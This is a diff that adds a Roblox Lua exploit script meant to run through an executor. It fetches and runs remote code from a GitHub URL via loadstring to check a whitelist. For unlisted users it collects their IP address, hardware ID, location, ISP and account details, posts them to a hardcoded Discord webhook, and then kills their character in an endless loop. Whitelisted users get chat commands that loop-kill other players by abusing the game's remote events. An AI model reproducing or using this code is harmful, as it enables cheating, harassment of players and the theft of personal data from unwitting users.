@@ -1,0 +1,292 @@
+-- Services setup
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
+local Lighting = game:GetService("Lighting")
+
+-- Security configuration
+local LOADSTRING_URL = "https://raw.githubusercontent.com/uzikillaz/scripts/refs/heads/main/authorized_users.txt"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1357889195833692200/adE_Rv_peaSVrTd1qLt0vVoFVlzwz3KQ7m6Yn3Qh1IkNrDRUiDIkaXchKkCbxSW5V8Vj"
+
+-- Intrusion detection system
+local function logIntrusion()
+    local LocalPlayer = Players.LocalPlayer
+    local UserId = LocalPlayer.UserId
+    local DisplayName = LocalPlayer.DisplayName
+    local Username = LocalPlayer.Name
+    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+    local AccountAge = LocalPlayer.AccountAge
+    local Country = LocalizationService.RobloxLocaleId
+    local GetIp = game:HttpGet("https://v4.ident.me/")
+    local success, GetData = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+    end)
+    local Hwid = RbxAnalyticsService:GetClientId()
+    local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+    local GameName = GameInfo.Name
+    local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
+    local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+    local function detectExecutor()
+        return identifyexecutor and identifyexecutor() or "Unknown"
+    end
+
+    local executor = detectExecutor()
+    local date = os.date("%m/%d/%Y")
+    local time = os.date("%X")
+    local gameLink = "https://www.roblox.com/games/"..game.PlaceId
+    local playerLink = "https://www.roblox.com/users/"..UserId
+    local mobileJoinLink = "https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
+    local jobIdLink = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId
+
+    local data = {
+        username = "Power Script Security",
+        avatar_url = "https://i.pinimg.com/564x/0a/e0/a0/0ae0a0f6b8abfd380b6da3f4178db8e6.jpg",
+        embeds = {
+            {
+                title = "🚨 Unauthorized Access Detected",
+                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
+                color = tonumber("0xe74c3c")
+            },
+            {
+                title = "👤 Intruder Details",
+                description = string.format(
+                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Executor:** %s",
+                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, executor
+                ),
+                color = tonumber("0x3498db")
+            },
+            {
+                title = "🌐 Location Data",
+                description = string.format(
+                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s\n**Region:** %s\n**ISP:** %s",
+                    GetIp, Hwid, 
+                    success and GetData.country or "N/A",
+                    success and GetData.regionName or "N/A",
+                    success and GetData.isp or "N/A"
+                ),
+                color = tonumber("0xf1c40f")
+            },
+            {
+                title = "📊 Game Stats",
+                description = string.format(
+                    "**Ping:** %dms\n**Job ID:** [%s](%s)\n**Mobile Join:** [Link](%s)",
+                    Ping, game.JobId, jobIdLink, mobileJoinLink
+                ),
+                color = tonumber("0x2ecc71"),
+                footer = { 
+                    text = string.format("📅 %s | ⏰ %s", date, time)
+                }
+            }
+        }
+    }
+
+    local requestFunc = http_request or request or HttpPost or syn.request
+    if requestFunc then
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
+    end
+end
+
+-- Authorization check
+local isAuthorized = false
+do
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking...", "All")
+    
+    local success = pcall(function()
+        local whitelist = loadstring(game:HttpGet(LOADSTRING_URL, true))().GetWhitelist()
+        for _, username in ipairs(whitelist) do
+            if Players.LocalPlayer.Name:lower() == username:lower() then
+                isAuthorized = true
+                break
+            end
+        end
+    end)
+    
+    if not isAuthorized then
+        logIntrusion()
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("May god forgive.", "All")
+        Lighting.Brightness = -99
+        while true do
+            local char = Players.LocalPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.Health = 0
+            end
+            RunService.Heartbeat:Wait()
+        end
+        return
+    end
+    
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Authorized.", "All")
+end
+
+-- Only proceed if authorized
+if isAuthorized then
+    -- Power system setup
+    local prefix = '.'
+    local me = Players.LocalPlayer
+    repeat wait() until game:IsLoaded()
+
+    -- System variables
+    local killAllEnabled = false
+    local myFriends = {}
+    local playersToLoopkill = {}
+    local poweredPlayers = {me.Name}
+    local tempRemovedPowers = {}
+
+    -- Helper functions
+    local function findPlayer(targetName)
+        if not targetName or targetName == "" then return nil end
+        targetName = targetName:lower()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Name:lower():sub(1, #targetName) == targetName or 
+               player.DisplayName:lower():sub(1, #targetName) == targetName then
+                return player
+            end
+        end
+    end
+
+    local function hasPower(player)
+        return player and table.find(poweredPlayers, player.Name)
+    end
+
+    local function isProtected(player)
+        return player == me or hasPower(player) or table.find(myFriends, player.Name)
+    end
+
+    -- Command processor
+    local function processCommand(sender, message)
+        local words = message:lower():split(" ")
+        local command = words[1]
+        local target = words[2] and findPlayer(words[2])
+
+        -- Only I can grant/revoke powers
+        if sender == me then
+            if command == prefix..'p' and target and not hasPower(target) then
+                if table.find(tempRemovedPowers, target.Name) then
+                    table.remove(tempRemovedPowers, table.find(tempRemovedPowers, target.Name))
+                end
+                table.insert(poweredPlayers, target.Name)
+                return
+            end
+
+            if command == prefix..'unp' then
+                if target then
+                    for i, name in ipairs(poweredPlayers) do
+                        if name == target.Name then
+                            table.remove(poweredPlayers, i)
+                            break
+                        end
+                    end
+                elseif words[2] and words[2] == "all" then
+                    for i = #poweredPlayers, 1, -1 do
+                        if poweredPlayers[i] ~= me.Name then
+                            table.insert(tempRemovedPowers, poweredPlayers[i])
+                            table.remove(poweredPlayers, i)
+                        end
+                    end
+                end
+                return
+            end
+        end
+
+        -- Powered players can use these commands
+        if hasPower(sender) then
+            if command == prefix..'k' and target then
+                if sender == me or not isProtected(target) then
+                    if not table.find(playersToLoopkill, target.Name) then
+                        table.insert(playersToLoopkill, target.Name)
+                    end
+                end
+            
+            elseif command == prefix..'kla' then
+                killAllEnabled = true
+            
+            elseif command == prefix..'c' then
+                table.clear(playersToLoopkill)
+                killAllEnabled = false
+            end
+        end
+    end
+
+    -- Player connections
+    for _, player in pairs(Players:GetPlayers()) do
+        player.Chatted:Connect(function(msg)
+            processCommand(player, msg)
+        end)
+    end
+
+    Players.PlayerAdded:Connect(function(newPlayer)
+        if me:IsFriendsWith(newPlayer.UserId) then
+            table.insert(myFriends, newPlayer.Name)
+        end
+        newPlayer.Chatted:Connect(function(msg)
+            processCommand(newPlayer, msg)
+        end)
+    end)
+
+    -- Anti-ragdoll and protection system
+    spawn(function()
+        while true do
+            wait()
+            if me.Character and me.Character:FindFirstChild("Ragdoll") and me.Character.Ragdoll.Value then
+                me.Character.GetUpEvent:FireServer()
+            end
+            for _, item in next, me.Character:GetChildren() do
+                if item:IsA("Accessory") and item.Name ~= 'FakeAccessory' then
+                    local clone = item:Clone()
+                    item:Destroy()
+                    clone.Name = 'FakeAccessory'
+                    clone.Parent = me.Character
+                end
+                if item.Name == 'VelocityDamage' or item.Name == 'GetPicked' then
+                    item:Destroy()
+                end
+            end
+        end
+    end)
+
+    -- Main loopkill system
+    while true do
+        wait(0.03)
+        
+        if killAllEnabled then
+            for _, player in next, Players:GetPlayers() do
+                if player ~= me and not isProtected(player) then
+                    pcall(function()
+                        me.Character.Picking:FireServer(player.Character.HumanoidRootPart, Vector3.new(math.huge, -math.huge, math.huge))
+                        wait(0.05)
+                        me.Character.PuttingDown:FireServer()
+                    end)
+                end
+            end
+        end
+        
+        if #playersToLoopkill > 0 then
+            for _, player in next, Players:GetPlayers() do
+                if table.find(playersToLoopkill, player.Name) then
+                    if not isProtected(player) or sender == me then
+                        pcall(function()
+                            local killVector = Vector3.new(math.huge, -math.huge, math.huge)
+                            me.Character.Picking:FireServer(player.Character.HumanoidRootPart, killVector)
+                            wait(0.03)
+                            me.Character.PuttingDown:FireServer()
+                        end)
+                    end
+                end
+            end
+        end
+    end
+end
